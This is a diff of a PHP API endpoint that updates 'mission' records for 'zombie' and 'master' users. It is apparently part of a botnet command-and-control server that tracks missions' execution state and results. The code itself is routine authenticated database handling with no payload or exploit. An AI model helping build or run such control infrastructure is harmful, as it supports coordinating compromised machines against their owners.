@@ -17,10 +17,10 @@ use \Firebase\JWT\JWT;
 // files needed to connect to database
 include_once 'config/database.php';
 include_once 'objects/mission.php';
+include_once 'objects/task.php';
 
 // auxilar functions
 include_once 'util/check_permission.php';
-include_once 'util/crypt.php';
  
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
@@ -36,61 +36,80 @@ if($jwt){
  
         // decode jwt
         $decoded = JWT::decode($jwt, $key, array('HS256'));
-
+        // Check who request and permission
+        $requested_by = $decoded->data->username;
+        
         // get database connection
         $database = new Database();
         $db = $database->getConnection();
         
-        // check who request and permissions
-        $requested_by = $decoded->data->username;
+        // instantiate object
+        $mission = new Mission($db);
 
         if (is_zombie($db, $requested_by)){
-            $by_zombie_username =  $requested_by;
-            $by_submit_at_bef =  "";
-            $by_submit_at_aft = "";
             $zombie_view = True;
+            $mission->id = (isset($data->id)) ? strval($data->id) : False;
+            $mission->read_confirm = (isset($data->read_confirm)) ? strval($data->read_confirm) : False;
+            $mission->running = (isset($data->running)) ? strval($data->running) : False;
+            $mission->result = (isset($data->result)) ? strval($data->result) : False;
+            $mission->exec_at = (isset($data->exec_at)) ? strval($data->exec_at) : False;
         }
-        
         else{
             $zombie_view = False;
-            // this function raise exceptions in case of error (not requested by a zombie, or requesting changes on another zombie)
-            //check_zombie_permissions($requested_by);
-            // set filters by request (only if requested by zombie)
-            //$by_zombie_username =  $requested_by;
-            $by_submit_at_bef = (isset($data->submit_at_bef)) ? $data->submit_at_bef : "";
-            $by_submit_at_aft = (isset($data->submit_at_aft)) ? $data->submit_at_aft : "";
-            $by_mission_type = (isset($data->mission_type)) ? $data->mission_type : "";
-        }
-        
-        // instantiate user object
-        $mission = new Mission($db);
-        
-        // retrieve records
-        $missions_data = $mission->read($by_zombie_username, $by_created_at_bef, $by_created_at_aft, 
-                                  $by_mission_type, $zombie_view=$zombie_view);
 
-        
-        // for ($i=0; $i < count($missions_data); $i++) { 
-        //     $missions_data[$i]["mission_content"] = json_decode(decrypt($missions_data[$i]["mission_content"], $key));
-        // }
+            $task = new Task($db);
+
+            $mission->id = $data->id;
+
+            if ($mission->idExists()) {
+                $task->id = $mission->task_id;
+                $task_author = ($task->idExists()) ? $task->master_username : False;
+            }
+            if (!$task_author) {
+                // set response code
+                http_response_code(401);
             
+                // show error message
+                echo json_encode(array(
+                    "message" => "task id not found."
+                ));
+                return False;
+            }
+            else{
+                // this function raise exceptions in case of error (not requested by a mission, or requesting changes on another mission)
+                check_master_permissions($requested_by, $task_author);
+                //$mission->task_id = $data->task_id;
+                $mission->zombie_username = $data->zombie_username;
+                $mission->read_confirm = $data->read_confirm;
+                $mission->running = $data->running;
+                $mission->result = $data->result;
+                $mission->exec_at = $data->exec_at;
+                $mission->manual_stop = $data->manual_stop;
+            }
+            
+        }
 
-        if($missions_data){
+        // update the mission record
+        if($mission->update()){
             
             // set response code
             http_response_code(200);
             
             // response in json format
-            echo json_encode($missions_data);
+            echo json_encode(
+                    array(
+                        "message" => "mission was updated."
+                    )
+                );
         }
         
-        // message if unable to update user
+        // message if unable to update
         else{
             // set response code
             http_response_code(401);
         
             // show error message
-            echo json_encode(array("message" => "Any mission found."));
+            echo json_encode(array("message" => "Unable to update mission."));
         }
     }
  
